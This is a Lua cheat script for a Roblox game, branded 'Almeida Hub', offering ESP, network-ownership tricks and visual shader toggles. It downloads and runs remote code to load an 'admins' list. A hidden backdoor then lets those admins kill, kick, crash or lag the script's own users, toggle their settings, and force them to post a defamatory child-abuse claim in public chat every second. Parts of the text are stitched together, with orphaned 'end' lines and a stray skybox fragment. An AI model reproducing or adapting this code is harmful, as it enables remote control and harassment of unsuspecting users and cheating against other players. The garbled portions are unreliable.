-- isnetworkowner
if not isnetworkowner then
    isnetworkowner = function(part)
        if not part or not part.Parent then return false end
        local head = part.Parent:FindFirstChild("Head")
        if head and head:FindFirstChild("PartOwner") then
            return head.PartOwner.Value == plr.Name
        end
        return false
    end
end

plr.CharacterAdded:Connect(function(c)
    task.wait(0.1)
    if c then
        HRP = c:FindFirstChild("HumanoidRootPart") or c:WaitForChild("HumanoidRootPart", 1)
        hum = c:FindFirstChild("Humanoid") or c:WaitForChild("Humanoid", 1)
        char = c
    end
end)

local function gblob()
    local char = plr.Character
    local hum = char:WaitForChild("Humanoid", 0.1)
    if hum and hum.SeatPart then
        if hum.SeatPart.Parent.Name == "CreatureBlobman" then
            return hum.SeatPart.Parent
        end
    end
end

local function disc(name)
    for i,v in cons do
        if i == name then
            v:Disconnect()
        end
    end
end

local function getplot()
    for i = 1, 5 do
        local plot = workspace.Plots:FindFirstChild("Plot"..i)
        local value = plot.PlotSign.ThisPlotsOwners:FindFirstChild("Value")
        if plot and value and value.Value:find(plr.Name) then
            return plot
        end
    end
end

local function sno(obj)
    SetNetOwner:FireServer(obj, obj.CFrame)
end

local function spawntoy(toy, cf)
    if not plr.CanSpawnToy.Value then
        plr.CanSpawnToy.Changed:Wait()
    end
    local t
    local toyadded
    toyadded = inv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c
            toyadded:Disconnect()
        end
    end)
    task.spawn(function()
        SpawnToy:InvokeServer(toy, cf, Vector3.new(0,0,0))
    end)
    local time = tick() + 1
    repeat task.wait() until t or tick() > time
    if t then
        return t
    else
        local plot = getplot()
        if plot then
            return workspace.PlotItems[plot.Name]:FindFirstChild(toy) or workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
        end
    end
end

local function grab(obj)
    obj.HoldPart.HoldItemRemoteFunction:InvokeServer(obj, char)
end

local function drop(obj, cf)
    obj.HoldPart.DropItemRemoteFunction:InvokeServer(obj, cf, Vector3.new(0,0,0))
end

local function tp(obj1, obj2)
    obj1.CFrame = CFrame.new(
        obj2.Position + obj2.Velocity *
        (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000) * 5
    )
end

local function stvel(hrp)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end

local function getname(v)
    return v:match("%((.-)%)")
end

local function HasProperty(obj, property)
    local ok = pcall(function() if obj[property] then end end)
    return ok
end

local admins = loadstring(game:HttpGet("https://raw.githubusercontent.com/Brovaky/Friendly/refs/heads/main/admins"))()

rs.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(...)
    local args = {...}
    local s = args[1]
    if s and typeof(args[2]) == "string" then
        if table.find(admins, s.Name) then
            local char = plr.Character
            local txt = string.split(args[2], " ")
            local nam = tostring(txt[2]):lower()
            if txt[1] == "!kill" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid.Health = 0
                end
            elseif txt[1] == "!bring" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                local char1 = game.Players:FindFirstChild(s.Name).Character
                if char and char:FindFirstChild("HumanoidRootPart") and char1 and char1:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.CFrame = char1.HumanoidRootPart.CFrame * CFrame.new(0,0,-5)
                end
            elseif txt[1] == "!kick" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                plr:Kick("Kicked by Almeida Hub admin ("..game.Players[s.Name].DisplayName..")")
            elseif txt[1] == "!reveal" and s.Name ~= plr.Name then
                TextChatService.TextChannels.RBXGeneral:SendAsync("Ya Premium Nasral!")
            elseif txt[1] == "!report" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                while task.wait(1) do
                    TextChatService.TextChannels.RBXGeneral:SendAsync("i touch kids")
                end
            elseif txt[1] == "!lag" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                plr.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = true
            elseif txt[1] == "!unlag" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                plr.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = false
            elseif txt[1] == "!crash" and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                while true do end
            elseif txt[1] == "!on" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                if not Toggles[txt[3]] then return end
                Toggles[txt[3]]:SetValue(true)
            elseif txt[1] == "!off" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                if not Toggles[txt[3]] then return end
                Toggles[txt[3]]:SetValue(false)
            elseif txt[1] == "!setfps" and txt[3] and (plr.Name:lower():find(nam) or plr.DisplayName:lower():find(nam) or nam == "all") then
                setfpscap(txt[3])
            end
        end
    end
end)

        end
    end
end)

do
    local box = Tabs.Visual:AddRightGroupbox("Misc")
    Window:SetCornerRadius(20)
    Library.ShowCustomCursor = true

    local nomeUsuario = Players.LocalPlayer.Name
    local watermark = Library:AddDraggableLabel("Almeida Hub")
    local fps = 0
    RunService.RenderStepped:Connect(function(dt) fps = math.round(1 / dt) end)

    task.spawn(function()
        while task.wait(0.5) do
            local ping = 0
            pcall(function()
                ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
            end)
            watermark:SetText(string.format(
                "Almeida Hub | %s | %s | %d FPS | %d ms",
                nomeUsuario, os.date("%H:%M:%S"), fps, ping
            ))
        end
    end)

    box:AddSlider("CameraFOV", {
        Text = "Camera FOV",
        Default = 70, Min = 40, Max = 120, Rounding = 0,
        Callback = function(v) workspace.CurrentCamera.FieldOfView = v end
    })

    box:AddToggle("AntiKickEsp", {
        Text = "Anti Kick Esp",
        Default = false,
        Callback = function(v)
            if v then
                for _,pl in Players:GetPlayers() do
                    if pl~=plr then
                        for i,v in workspace[pl.Name.."SpawnedInToys"]:GetChildren() do
                            if v:FindFirstChild("StickyPart") then
                                local high = Instance.new("Highlight", v)
                                high.Adornee = v
                                if v.StickyPart.StickyWeld.Part1 then
                                    high.FillColor = Color3.fromRGB(192,0,0)
                                else
                                    high.FillColor = Color3.fromRGB(182,0,0)
                                end
                                v.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
                                    if v.StickyPart.StickyWeld.Part1 then
                                        high.FillColor = Color3.fromRGB(192,173,0)
                                    else
                                        high.FillColor = Color3.fromRGB(0,194,0)
                                    end
                                end)
                            end
                        end
                        cons["antikickesp"..pl.Name] = workspace[pl.Name.."SpawnedInToys"].ChildAdded:Connect(function(v)
                            task.wait(0.4)
                            if v:FindFirstChild("StickyPart") then
                                local high = Instance.new("Highlight", v)
                                high.Adornee = v
                                if v.StickyPart.StickyWeld.Part1 then
                                    high.FillColor = Color3.fromRGB(255,0,0)
                                else
                                    high.FillColor = Color3.fromRGB(255,0,0)
                                end
                                v.StickyPart.StickyWeld:GetPropertyChangedSignal("Part1"):Connect(function()
                                    if v.StickyPart.StickyWeld.Part1 then
                                        high.FillColor = Color3.fromRGB(255,0,0)
                                    else
                                        high.FillColor = Color3.fromRGB(255,0,0)
                                    end
                                end)
                            end
                        end)
                    end
                end
            else
                for i,v in Players:GetPlayers() do
                    if v~=plr then
                        if cons["antikickesp"..v.Name] then cons["antikickesp"..v.Name]:Disconnect(); cons["antikickesp"..v.Name] = nil end
                        for i,v in workspace[v.Name.."SpawnedInToys"]:GetChildren() do
                            if v:FindFirstChild("StickyPart") then
                                if v.Parent:FindFirstChild("Highlight") then v.Parent.Highlight:Destroy() end
                            end
                        end
                    end
                end
            end
        end
    })

    box:AddSlider("PCLDTransparency", {
        Text = "Transparency",
        Default = 0.6, Min = 0, Max = 1, Rounding = 1
    })

    box:AddToggle("ViewPCLD", {
        Text = "View PCLD (Bordas Rainbow)",
        Default = false,
        Callback = function(v)
            cons = cons or {}
            if v then
                local trans = Options.PCLDTransparency and Options.PCLDTransparency.Value or 0.2
                local adornments = {}
                local hue = 0
                local function AddBorders(obj)
                    if obj.Name == "PlayerCharacterLocationDetector" and obj:IsA("BasePart") and not obj:FindFirstChild("PCLD_Borders") then
                        obj.Transparency = 1
                        obj.Material = Enum.Material.SmoothPlastic
                        local selection = Instance.new("SelectionBox")
                        selection.Name = "PCLD_Borders"
                        selection.Adornee = obj
                        selection.LineThickness = 0.06
                        selection.Transparency = trans
                        selection.Color3 = Color3.fromHSV(0,1,1)
                        selection.Parent = obj
                        table.insert(adornments, selection)
                    end
                end
                for _, child in ipairs(workspace:GetChildren()) do AddBorders(child) end
                cons["viewpcld"] = workspace.ChildAdded:Connect(AddBorders)
                cons["rainbow"] = RunService.RenderStepped:Connect(function(dt)
                    hue = (hue + dt * 0.09) % 1
                    local rainbowColor = Color3.fromHSV(hue,1,1)
                    for i = #adornments, 1, -1 do
                        local sb = adornments[i]
                        if sb and sb.Parent and sb.Adornee and sb.Adornee.Parent then
                            sb.Color3 = rainbowColor
                        else
                            if sb then sb:Destroy() end
                            table.remove(adornments, i)
                        end
                    end
                end)
            else
                if cons["viewpcld"] then cons["viewpcld"]:Disconnect(); cons["viewpcld"] = nil end
                if cons["rainbow"] then cons["rainbow"]:Disconnect(); cons["rainbow"] = nil end
                for _, part in ipairs(workspace:GetChildren()) do
                    if part.Name == "PlayerCharacterLocationDetector" and part:IsA("BasePart") then
                        local border = part:FindFirstChild("PCLD_Borders")
                        if border then border:Destroy() end
                        part.Transparency = 1
                    end
                end
            end
        end
    })

    -- Player ESP (arco-íris)
    local rainbowConnections = {}
    local function GetRainbowColor()
        local tempo = os.clock() * 1
        return Color3.fromHSV(tempo % 1, 1, 1)
    end

    local function AddESP(plr)
        if plr == Players.LocalPlayer then return end
        local function Apply(char)
            if char:FindFirstChild("VTX_ESP") or char:FindFirstChild("VTX_NameESP") then return end
            local hl = Instance.new("Highlight")
            hl.Name = "VTX_ESP"
            hl.FillTransparency = 1
            hl.OutlineTransparency = 0
            hl.OutlineColor = GetRainbowColor()
            hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            hl.Parent = char
            local head = char:FindFirstChild("Head")
            if head then
                local bill = Instance.new("BillboardGui")
                bill.Name = "VTX_NameESP"
                bill.Size = UDim2.new(0,120,0,50)
                bill.StudsOffset = Vector3.new(0,3.5,0)
                bill.AlwaysOnTop = true
                bill.MaxDistance = 3000
                bill.Parent = head
                local txt = Instance.new("TextLabel")
                txt.Size = UDim2.new(1,0,1,0)
                txt.BackgroundTransparency = 1
                txt.Text = "(" .. plr.Name .. ")"
                txt.TextColor3 = Color3.fromRGB(255,255,255)
                txt.TextStrokeTransparency = 0
                txt.TextStrokeColor3 = Color3.new(0,0,0)
                txt.TextScaled = true
                txt.Font = Enum.Font.SourceSansBold
                txt.AnchorPoint = Vector2.new(0.5,0.5)
                txt.Position = UDim2.new(0.5,0,0.5,0)
                txt.Parent = bill
            end
            local conn = RunService.RenderStepped:Connect(function()
                if not hl:IsDescendantOf(game) then conn:Disconnect(); rainbowConnections[char] = nil; return end
                hl.OutlineColor = GetRainbowColor()
            end)
            rainbowConnections[char] = conn
        end
        if plr.Character then Apply(plr.Character) end
        plr.CharacterAdded:Connect(Apply)
    end

    local function RemoveESP()
        for char, conn in pairs(rainbowConnections) do conn:Disconnect() end
        rainbowConnections = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character then
                local esp = plr.Character:FindFirstChild("VTX_ESP")
                if esp then esp:Destroy() end
                local head = plr.Character:FindFirstChild("Head")
                if head then
                    local nameesp = head:FindFirstChild("VTX_NameESP")
                    if nameesp then nameesp:Destroy() end
                end
            end
        end
    end

    Players.PlayerAdded:Connect(function(novoJogador)
        task.spawn(function()
            novoJogador.CharacterAdded:Wait()
            if _G.ESPAtivado then AddESP(novoJogador) end
        end)
    end)

    box:AddToggle("PlayerESP", {
        Text = "Player ESP",
        Default = false,
        Callback = function(ativado)
            _G.ESPAtivado = ativado
            if ativado then
                for _, plr in ipairs(Players:GetPlayers()) do AddESP(plr) end
            else
                RemoveESP()
            end
        end
    })

                ["Deep Space 2"]={Bk="rbxassetid://159248188",Dn="rbxassetid://159248183",Ft="rbxassetid://159248187",Lf="rbxassetid://159248173",Rt="rbxassetid://159248192",Up="rbxassetid://159248176"},

                ["Stylized"]={Bk="rbxassetid://18351376859",Dn="rbxassetid://18351374919",Ft="rbxassetid://18351376800",Lf="rbxassetid://18351376469",Rt="rbxassetid://18351376457",Up="rbxassetid://18351377189"},
                ["Minecraft"]={Bk="rbxassetid://8735166756",Dn="rbxassetid://8735166707",Ft="rbxassetid://8735231668",Lf="rbxassetid://8735166755",Rt="rbxassetid://8735166751",Up="rbxassetid://8735166729"},
                ["Cloudy Rain"]={Bk="rbxassetid://4498828382",Dn="rbxassetid://4498828812",Ft="rbxassetid://4498829917",Lf="rbxassetid://4498830911",Rt="rbxassetid://4498830417",Up="rbxassetid://4498831746"},
                ["Black Cloudy Rain"]={Bk="rbxassetid://149679669",Dn="rbxassetid://149681979",Ft="rbxassetid://149679690",Lf="rbxassetid://149679709",Rt="rbxassetid://149679722",Up="rbxassetid://149680199"},

        end

    -- Sky Bright
    local Lighting = game:GetService("Lighting")
    local Original = {
        Sky = Lighting:FindFirstChildOfClass("Sky"),
        Atmosphere = Lighting:FindFirstChildOfClass("Atmosphere"),
        CC = Lighting:FindFirstChildOfClass("ColorCorrectionEffect"),
        Brightness = Lighting.Brightness,
        ClockTime = Lighting.ClockTime,
        Ambient = Lighting.Ambient,
        OutdoorAmbient = Lighting.OutdoorAmbient,
        EnvDiff = Lighting.EnvironmentDiffuseScale,
        EnvSpec = Lighting.EnvironmentSpecularScale
    }

    local function applySky()
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("ColorCorrectionEffect") then v:Destroy() end
        end
        Lighting.ClockTime = 3.1
        Lighting.Brightness = 1.6
        Lighting.GlobalShadows = true
        Lighting.EnvironmentDiffuseScale = 0.75
        Lighting.EnvironmentSpecularScale = 0.35
        Lighting.Ambient = Color3.fromRGB(90,90,100)
        Lighting.OutdoorAmbient = Color3.fromRGB(70,70,80)
        local sky = Instance.new("Sky")
        sky.SkyboxBk = "rbxassetid://159454299"
        sky.SkyboxDn = "rbxassetid://159454296"
        sky.SkyboxFt = "rbxassetid://159454293"
        sky.SkyboxLf = "rbxassetid://159454286"
        sky.SkyboxRt = "rbxassetid://159454300"
        sky.SkyboxUp = "rbxassetid://159454288"
        sky.StarCount = 1800
        sky.CelestialBodiesShown = false
        sky.Parent = Lighting
        local atm = Instance.new("Atmosphere")
        atm.Density = 0.18; atm.Offset = 0.1; atm.Color = Color3.fromRGB(150,150,170); atm.Decay = Color3.fromRGB(50,50,60); atm.Glare = 0.15; atm.Haze = 1; atm.Parent = Lighting
        local cc = Instance.new("ColorCorrectionEffect")
        cc.Brightness = 0.08; cc.Contrast = 0.12; cc.Saturation = -0.05; cc.TintColor = Color3.fromRGB(210,220,255); cc.Parent = Lighting
    end

    local function resetSky()
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("ColorCorrectionEffect") then v:Destroy() end
        end
        if Original.Sky then Original.Sky.Parent = Lighting end
        if Original.Atmosphere then Original.Atmosphere.Parent = Lighting end
        if Original.CC then Original.CC.Parent = Lighting end
        Lighting.Brightness = Original.Brightness
        Lighting.ClockTime = Original.ClockTime
        Lighting.Ambient = Original.Ambient
        Lighting.OutdoorAmbient = Original.OutdoorAmbient
        Lighting.EnvironmentDiffuseScale = Original.EnvDiff
        Lighting.EnvironmentSpecularScale = Original.EnvSpec
    end

    box:AddToggle("SkyToggle", {
        Text = "Sky (Bright)",
        Default = false,
        Callback = function(v) if v then applySky() else resetSky() end end
    })

    local function applyDay()
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("ColorCorrectionEffect") then v:Destroy() end
        end
        Lighting.ClockTime = 14
        Lighting.Brightness = 2
        Lighting.GlobalShadows = true
        Lighting.EnvironmentDiffuseScale = 1
        Lighting.EnvironmentSpecularScale = 0.8
        Lighting.Ambient = Color3.fromRGB(135,135,135)
        Lighting.OutdoorAmbient = Color3.fromRGB(180,180,180)
        local sky = Instance.new("Sky")
        sky.SkyboxBk = "rbxassetid://271042516"
        sky.SkyboxDn = "rbxassetid://271077243"
        sky.SkyboxFt = "rbxassetid://271042556"
        sky.SkyboxLf = "rbxassetid://271042310"
        sky.SkyboxRt = "rbxassetid://271042467"
        sky.SkyboxUp = "rbxassetid://271077958"
        sky.CelestialBodiesShown = true
        sky.StarCount = 0
        sky.Parent = Lighting
        local atm = Instance.new("Atmosphere")
        atm.Density = 0.3; atm.Offset = 0.2; atm.Color = Color3.fromRGB(199,199,199); atm.Decay = Color3.fromRGB(255,255,255); atm.Glare = 0.2; atm.Haze = 1.5; atm.Parent = Lighting
        local cc = Instance.new("ColorCorrectionEffect")
        cc.Brightness = 0.05; cc.Contrast = 0.1; cc.Saturation = 0.1; cc.TintColor = Color3.fromRGB(255,245,235); cc.Parent = Lighting
    end

    box:AddToggle("DaySky", {
        Text = "Day Sky",
        Default = false,
        Callback = function(v) if v then applyDay() else resetSky() end end
    })

    -- Shader PVP
    box:AddToggle("ShaderPvp", {
        Text = "Shader PVP",
        Default = false,
        Callback = function(Value)
            if Value then
                Lighting.Brightness = 2
                Lighting.ClockTime = 17
                Lighting.GlobalShadows = true
                Lighting.OutdoorAmbient = Color3.fromRGB(70,70,70)
                Lighting.Ambient = Color3.fromRGB(80,80,80)
                Lighting.FogStart = 200
                Lighting.FogEnd = 3000
                local atmosphere = Lighting:FindFirstChild("PVPAtmosphere") or Instance.new("Atmosphere")
                atmosphere.Name = "PVPAtmosphere"
                atmosphere.Parent = Lighting
                atmosphere.Density = 0.15
                atmosphere.Haze = 0.5
                atmosphere.Color = Color3.fromRGB(190,190,190)
                atmosphere.Decay = Color3.fromRGB(60,60,60)
                atmosphere.Glare = 0
                atmosphere.Haze = 2.5
                local blur = Lighting:FindFirstChild("PVPBlur") or Instance.new("BlurEffect")
                blur.Name = "PVPBlur"
                blur.Parent = Lighting
                blur.Size = 3
                local color = Lighting:FindFirstChild("PVPColor") or Instance.new("ColorCorrectionEffect")
                color.Name = "PVPColor"
                color.Parent = Lighting
                color.Brightness = -0.05
                color.Contrast = 0.35
                color.Saturation = -0.2
                color.TintColor = Color3.fromRGB(220,220,220)
                local bloom = Lighting:FindFirstChild("PVPBloom") or Instance.new("BloomEffect")
                bloom.Name = "PVPBloom"
                bloom.Parent = Lighting
                bloom.Intensity = 0.3
                bloom.Size = 20
                bloom.Threshold = 1
                local dof = Lighting:FindFirstChild("PVPDOF") or Instance.new("DepthOfFieldEffect")
                dof.Name = "PVPDOF"
                dof.Parent = Lighting
                dof.FarIntensity = 0.15
                dof.FocusDistance = 50
                dof.InFocusRadius = 25
                dof.NearIntensity = 0
                local sun = Lighting:FindFirstChild("PVPSun") or Instance.new("SunRaysEffect")
                sun.Name = "PVPSun"
                sun.Parent = Lighting
                sun.Intensity = 0.02
                sun.Spread = 0.4
            else
                for _, name in ipairs({"PVPAtmosphere","PVPBlur","PVPColor","PVPBloom","PVPDOF","PVPSun"}) do
                    local obj = Lighting:FindFirstChild(name)
                    if obj then obj:Destroy() end
                end
                Lighting.Brightness = 2
                Lighting.ClockTime = 14
                Lighting.FogStart = 0
                Lighting.FogEnd = 100000
                Lighting.GlobalShadows = true
                Lighting.OutdoorAmbient = Color3.fromRGB(128,128,128)
                Lighting.Ambient = Color3.fromRGB(128,128,128)
            end
        end
    })

    box:AddToggle("FPSOptimizer", {
        Text = "FPS Optimizer",
        Default = false,
        Callback = function(Value)
            if Value then
                Lighting.GlobalShadows = false
                Lighting.FogEnd = 100000
                Lighting.Brightness = 1
                for _, v in ipairs(Lighting:GetChildren()) do
                    if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("DepthOfFieldEffect") then
                        v.Enabled = false
                    end
                end
                local Terrain = workspace.Terrain
                if Terrain then
                    Terrain.WaterWaveSize = 0
                    Terrain.WaterWaveSpeed = 0
                    Terrain.WaterReflectance = 0
                    Terrain.WaterTransparency = 1
                end
                for _, obj in ipairs(workspace:GetDescendants()) do
                    if obj:IsA("BasePart") then
                        obj.Material = Enum.Material.Plastic
                        obj.Reflectance = 0
                    elseif obj:IsA("Decal") or obj:IsA("Texture") then
                        obj.Transparency = 1
                    elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
                        obj.Enabled = false
                    end
                end
            else
                Lighting.GlobalShadows = true
                Lighting.Brightness = 2
                for _, v in ipairs(Lighting:GetChildren()) do
                    if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("BloomEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("DepthOfFieldEffect") then
                        v.Enabled = true
                    end
                end
            end
        end
    })

    -- Best Shaders 2026
    do
        local shaderBox = Tabs.Visual:AddRightGroupbox("Best Shaders 2026", "sparkles")
        local shaderLighting = game:GetService("Lighting")
        local shaderOriginal = {
            Brightness = shaderLighting.Brightness,
            Ambient = shaderLighting.Ambient,
            OutdoorAmbient = shaderLighting.OutdoorAmbient,
            ClockTime = shaderLighting.ClockTime,
            GlobalShadows = shaderLighting.GlobalShadows,
            FogEnd = shaderLighting.FogEnd,
            FogStart = shaderLighting.FogStart,
        }
        local shaderEffects = {}
        local currentShader = nil

        local function CreateEffects()
            shaderEffects.Bloom = shaderLighting:FindFirstChild("VTX_Bloom") or Instance.new("BloomEffect")
            shaderEffects.Color = shaderLighting:FindFirstChild("VTX_Color") or Instance.new("ColorCorrectionEffect")
            shaderEffects.Atmosphere = shaderLighting:FindFirstChild("VTX_Atmosphere") or Instance.new("Atmosphere")
            shaderEffects.DOF = shaderLighting:FindFirstChild("VTX_DOF") or Instance.new("DepthOfFieldEffect")
            shaderEffects.SunRays = shaderLighting:FindFirstChild("VTX_SunRays") or Instance.new("SunRaysEffect")
            for _, eff in pairs(shaderEffects) do
                eff.Name = "VTX_" .. eff.ClassName
                eff.Parent = shaderLighting
            end
        end

        local function DestroyAll()
            for _, eff in pairs(shaderEffects) do
                if eff and eff.Parent then eff:Destroy() end
            end
            shaderEffects = {}
            shaderLighting.Brightness = shaderOriginal.Brightness
            shaderLighting.Ambient = shaderOriginal.Ambient
            shaderLighting.OutdoorAmbient = shaderOriginal.OutdoorAmbient
            shaderLighting.ClockTime = shaderOriginal.ClockTime
            shaderLighting.GlobalShadows = shaderOriginal.GlobalShadows
            shaderLighting.FogEnd = shaderOriginal.FogEnd
            shaderLighting.FogStart = shaderOriginal.FogStart
            currentShader = nil
        end

        DestroyAll()

        local shaderPresets = {}

        shaderPresets.UltraRTX = function()
            CreateEffects()
            shaderLighting.Brightness = 2.85
            shaderLighting.ClockTime = 14.8
            shaderLighting.GlobalShadows = true
            shaderLighting.Ambient = Color3.fromRGB(95,105,125)
            shaderLighting.OutdoorAmbient = Color3.fromRGB(115,125,145)
            shaderEffects.Bloom.Intensity = 1.95; shaderEffects.Bloom.Size = 28; shaderEffects.Bloom.Threshold = 0.78
            shaderEffects.Color.Brightness = 0.09; shaderEffects.Color.Contrast = 0.18; shaderEffects.Color.Saturation = 0.92; shaderEffects.Color.TintColor = Color3.fromRGB(225,240,255)
            shaderEffects.Atmosphere.Density = 0.23; shaderEffects.Atmosphere.Offset = 0.25; shaderEffects.Atmosphere.Color = Color3.fromRGB(160,190,255); shaderEffects.Atmosphere.Decay = Color3.fromRGB(110,140,235); shaderEffects.Atmosphere.Glare = 0.45; shaderEffects.Atmosphere.Haze = 1.15
            shaderEffects.DOF.FocusDistance = 180; shaderEffects.DOF.InFocusRadius = 140; shaderEffects.DOF.NearIntensity = 0.02; shaderEffects.DOF.FarIntensity = 0.06
            shaderEffects.SunRays.Intensity = 0.28; shaderEffects.SunRays.Spread = 0.95
        end

        shaderPresets.CinematicRealistic = function()
            CreateEffects()
            shaderLighting.ClockTime = 15.5; shaderLighting.Brightness = 3.4
            shaderEffects.Bloom.Intensity = 1.55; shaderEffects.Bloom.Size = 24; shaderEffects.Bloom.Threshold = 0.82
            shaderEffects.Color.Brightness = 0.06; shaderEffects.Color.Contrast = 0.28; shaderEffects.Color.Saturation = 0.88; shaderEffects.Color.TintColor = Color3.fromRGB(255,245,235)
            shaderEffects.Atmosphere.Density = 0.19; shaderEffects.Atmosphere.Haze = 0.75; shaderEffects.Atmosphere.Glare = 0.3
        end

        shaderPresets.EtherealDream = function()
            CreateEffects()
            shaderLighting.ClockTime = 13.2; shaderLighting.Brightness = 2.9
            shaderLighting.Ambient = Color3.fromRGB(130,145,170)
            shaderEffects.Bloom.Intensity = 1.75; shaderEffects.Bloom.Size = 26; shaderEffects.Bloom.Threshold = 0.72
            shaderEffects.Color.Brightness = 0.08; shaderEffects.Color.Contrast = 0.15; shaderEffects.Color.Saturation = 1.25; shaderEffects.Color.TintColor = Color3.fromRGB(225,235,255)
            shaderEffects.Atmosphere.Density = 0.26; shaderEffects.Atmosphere.Offset = 0.3; shaderEffects.Atmosphere.Color = Color3.fromRGB(195,215,255); shaderEffects.Atmosphere.Decay = Color3.fromRGB(170,200,255); shaderEffects.Atmosphere.Glare = 0.4; shaderEffects.Atmosphere.Haze = 1.25
            shaderEffects.SunRays.Intensity = 0.22; shaderEffects.SunRays.Spread = 0.75
        end

        shaderPresets.DivineGoldenHour = function()
            CreateEffects()
            shaderLighting.ClockTime = 17.8; shaderLighting.Brightness = 2.95
            shaderEffects.Bloom.Intensity = 1.65; shaderEffects.Bloom.Size = 24; shaderEffects.Bloom.Threshold = 0.75
            shaderEffects.Color.Brightness = 0.11; shaderEffects.Color.Contrast = 0.20; shaderEffects.Color.Saturation = 1.08; shaderEffects.Color.TintColor = Color3.fromRGB(255,190,115)
            shaderEffects.Atmosphere.Density = 0.29; shaderEffects.Atmosphere.Color = Color3.fromRGB(255,165,75); shaderEffects.Atmosphere.Decay = Color3.fromRGB(255,135,55); shaderEffects.Atmosphere.Haze = 1.0; shaderEffects.Atmosphere.Glare = 0.42
            shaderEffects.SunRays.Intensity = 0.26; shaderEffects.SunRays.Spread = 0.8
        end

        shaderPresets.Photorealistic = function()
            CreateEffects()
            shaderLighting.ClockTime = 14; shaderLighting.Brightness = 2.65; shaderLighting.GlobalShadows = true
            shaderEffects.Bloom.Intensity = 1.35; shaderEffects.Bloom.Size = 22; shaderEffects.Bloom.Threshold = 0.9
            shaderEffects.Color.Brightness = 0.04; shaderEffects.Color.Contrast = 0.32; shaderEffects.Color.Saturation = 0.78; shaderEffects.Color.TintColor = Color3.fromRGB(245,240,235)
            shaderEffects.Atmosphere.Density = 0.145; shaderEffects.Atmosphere.Offset = 0.1; shaderEffects.Atmosphere.Haze = 0.6; shaderEffects.Atmosphere.Glare = 0.25
            shaderEffects.DOF.FocusDistance = 250; shaderEffects.DOF.InFocusRadius = 180; shaderEffects.DOF.NearIntensity = 0.015; shaderEffects.DOF.FarIntensity = 0.08
        end

        shaderPresets.CelestialBloom = function()
            CreateEffects()
            shaderLighting.ClockTime = 16.5; shaderLighting.Brightness = 3.1
            shaderEffects.Bloom.Intensity = 1.95; shaderEffects.Bloom.Size = 29; shaderEffects.Bloom.Threshold = 0.68
            shaderEffects.Color.Brightness = 0.13; shaderEffects.Color.Contrast = 0.16; shaderEffects.Color.Saturation = 1.32; shaderEffects.Color.TintColor = Color3.fromRGB(205,230,255)
            shaderEffects.Atmosphere.Density = 0.24; shaderEffects.Atmosphere.Color = Color3.fromRGB(175,205,255); shaderEffects.Atmosphere.Decay = Color3.fromRGB(135,180,255); shaderEffects.Atmosphere.Glare = 0.48; shaderEffects.Atmosphere.Haze = 1.35
            shaderEffects.SunRays.Intensity = 0.24; shaderEffects.SunRays.Spread = 0.72
        end

        local function ActivateShader(name)
            if currentShader == name then return end
            DestroyAll()
            shaderPresets[name]()
            currentShader = name
        end

        local shaderToggles = {}
        shaderToggles.UltraRTX = shaderBox:AddToggle("UltraRTX", { Text = "Ultra RTX (Melhor Geral)", Default = false, Callback = function(v) if v then ActivateShader("UltraRTX") Library:Notify("Ultra RTX Ativado 🔥", 4) elseif currentShader == "UltraRTX" then DestroyAll() end end })
        shaderToggles.Cinematic = shaderBox:AddToggle("Cinematic", { Text = "Cinematic Realistic", Default = false, Callback = function(v) if v then ActivateShader("CinematicRealistic") Library:Notify("Cinematic Realistic Ativado", 4) elseif currentShader == "CinematicRealistic" then DestroyAll() end end })
        shaderToggles.Ethereal = shaderBox:AddToggle("Ethereal", { Text = "Ethereal Dream ✨", Default = false, Callback = function(v) if v then ActivateShader("EtherealDream") Library:Notify("Ethereal Dream Ativado", 4) elseif currentShader == "EtherealDream" then DestroyAll() end end })
        shaderToggles.GoldenHour = shaderBox:AddToggle("GoldenHour", { Text = "Divine Golden Hour", Default = false, Callback = function(v) if v then ActivateShader("DivineGoldenHour") Library:Notify("Divine Golden Hour Ativado", 4) elseif currentShader == "DivineGoldenHour" then DestroyAll() end end })
        shaderToggles.Photorealistic = shaderBox:AddToggle("Photorealistic", { Text = "Photorealistic", Default = false, Callback = function(v) if v then ActivateShader("Photorealistic") Library:Notify("Photorealistic Ativado", 4) elseif currentShader == "Photorealistic" then DestroyAll() end end })
